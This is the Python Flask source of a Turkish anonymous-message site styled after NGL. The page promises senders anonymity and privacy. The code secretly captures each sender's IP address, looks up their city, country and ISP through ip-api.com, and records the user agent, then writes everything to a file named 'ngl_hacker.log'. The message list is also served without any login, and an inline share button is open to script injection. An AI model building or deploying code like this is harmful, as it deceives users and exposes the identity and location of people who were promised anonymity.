from flask import Flask, request, render_template_string, redirect
import logging
import requests
import os
from datetime import datetime

# Logging ayarları
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[
        logging.FileHandler('ngl_hacker.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)

app = Flask(__name__)

# Gelen mesajları burada tut (basit liste, sunucu yeniden başladığında sıfırlanır)
messages = []

# Ana sayfa HTML (kullanıcı adı + mesaj kutusu bir arada)
HOME_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>itiraf_ipal</title>
    <style>
        body {
            background: linear-gradient(135deg, #000000, #1a0033);
            color: white;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 20px;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        h1 {
            font-size: 4rem;
            font-weight: 800;
            margin-bottom: 20px;
            background: linear-gradient(90deg, #ff00cc, #3333ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        input[type="text"], textarea {
            width: 80%;
            max-width: 500px;
            padding: 15px;
            font-size: 1.2rem;
            border: none;
            border-radius: 16px;
            background: rgba(255,255,255,0.1);
            color: white;
            margin-bottom: 20px;
        }
        input[type="text"]::placeholder, textarea::placeholder { color: rgba(255,255,255,0.6); }
        textarea {
            height: 120px;
            resize: none;
        }
        button {
            padding: 16px 50px;
            background: linear-gradient(90deg, #ff00cc, #3333ff);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 1.3rem;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover { transform: scale(1.05); }
        .info, .footer {
            margin-top: 30px;
            font-size: 0.9rem;
            opacity: 0.7;
            color: #ccc;
        }
        .success {
            font-size: 2rem;
            margin-top: 50px;
            animation: fadeIn 1s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    {% if success %}
        <div class="success">✅ Mesajın gönderildi!</div>
        <p>gizlilik esastır.</p>
    {% else %}
        <h1>@{{ username if username else 'NGL Anonim' }}</h1>
        <p>Anonim mesaj gönder</p>
        <form method="POST">
            <input type="text" name="username" placeholder="Kullanıcı adın (isteğe bağlı)" value="{{ username }}" autocomplete="off"><br>
            <textarea name="message" placeholder="Buraya yaz..." required></textarea><br>
            <button type="submit">Gönder</button>
        </form>
        <div class="info">Kullanıcı adı boş bırakılırsa anonim kalır</div>
        <div class="footer">Bu site itiraf_ipal tarafından yapılmıştır</div>
    {% endif %}
</body>
</html>
"""

# Mesajlar sayfası HTML – kutucuklar burada listelenecek
MESAJLAR_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>itiraf_ipal - Gelen Mesajlar</title>
    <style>
        body {
            background: linear-gradient(135deg, #000000, #1a0033);
            color: white;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            margin: 0;
            padding: 20px;
        }
        h1 {
            text-align: center;
            font-size: 3rem;
            margin-bottom: 30px;
            background: linear-gradient(90deg, #ff00cc, #3333ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .message-box {
            background: rgba(255,255,255,0.1);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.2);
        }
        .username {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 10px;
            color: #ff00cc;
        }
        .message {
            font-size: 1.3rem;
            margin-bottom: 10px;
        }
        .footer {
            font-size: 0.9rem;
            opacity: 0.7;
            text-align: center;
            margin-top: 10px;
        }
        .share-btn {
            background: #ff00cc;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <h1>Gelen Mesajlar</h1>
    {% for msg in messages %}
        <div class="message-box">
            <div class="username">@{{ msg.username or 'Anonim' }}</div>
            <div class="message">{{ msg.message }}</div>
            <div class="footer">NGL by itiraf_ipal admini :)</div>
            <button class="share-btn" onclick="navigator.share({title: 'NGL Mesaj', text: '@{{ msg.username }}: {{ msg.message }}'})">Instagram'a Paylaş</button>
        </div>
    {% else %}
        <p>Henüz mesaj yok.</p>
    {% endfor %}
</body>
</html>
"""

# Gelen mesajları tutacak liste (sunucu yeniden başladığında sıfırlanır)
messages = []

@app.route('/', methods=['GET', 'POST'])
def home():
    username = request.args.get('username', '') or request.form.get('username', '')
    if request.method == 'POST':
        msg = request.form.get('message', '').strip()
        if msg:
            client_ip = None
            if 'CF-Connecting-IP' in request.headers:
                client_ip = request.headers['CF-Connecting-IP'].strip()
            elif 'X-Forwarded-For' in request.headers:
                forwarded = request.headers['X-Forwarded-For'].split(',')[0].strip()
                if forwarded and forwarded != 'unknown':
                    client_ip = forwarded
            elif 'X-Real-IP' in request.headers:
                client_ip = request.headers['X-Real-IP'].strip()
            else:
                client_ip = request.remote_addr or '127.0.0.1'

            user_agent = request.headers.get('User-Agent', 'Bilinmiyor')[:200]

            location = "Konum alınamadı"
            isp = "Bilinmiyor"
            if client_ip not in ['127.0.0.1', '::1']:
                try:
                    geo = requests.get(f"http://ip-api.com/json/{client_ip}", timeout=6).json()
                    if geo.get('status') == 'success':
                        city = geo.get('city', 'Bilinmiyor')
                        region = geo.get('regionName', '')
                        country = geo.get('country', '')
                        location = f"{city}, {region}, {country}"
                        isp = geo.get('isp', 'Bilinmiyor')
                except:
                    pass

            log_entry = f"@{username or 'Anonim'} | MESAJ: {msg} | IP: {client_ip} | KONUM: {location} | ISP: {isp} | UA: {user_agent}"
            logging.info(log_entry)
            print(f"[YENİ MESAJ] {log_entry}")

            # Mesajı listeye ekle
            messages.append({
                "username": username or 'Anonim',
                "message": msg,
                "ip": client_ip,
                "location": location,
                "isp": isp,
                "user_agent": user_agent,
                "timestamp": datetime.now().strftime("%d.%m.%Y %H:%M:%S")
            })

            return render_template_string(HOME_HTML, username=username, success=True)

    return render_template_string(HOME_HTML, username=username, success=False)

@app.route('/mesajlar')
def mesajlar():
    return render_template_string(MESAJLAR_HTML, messages=messages)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
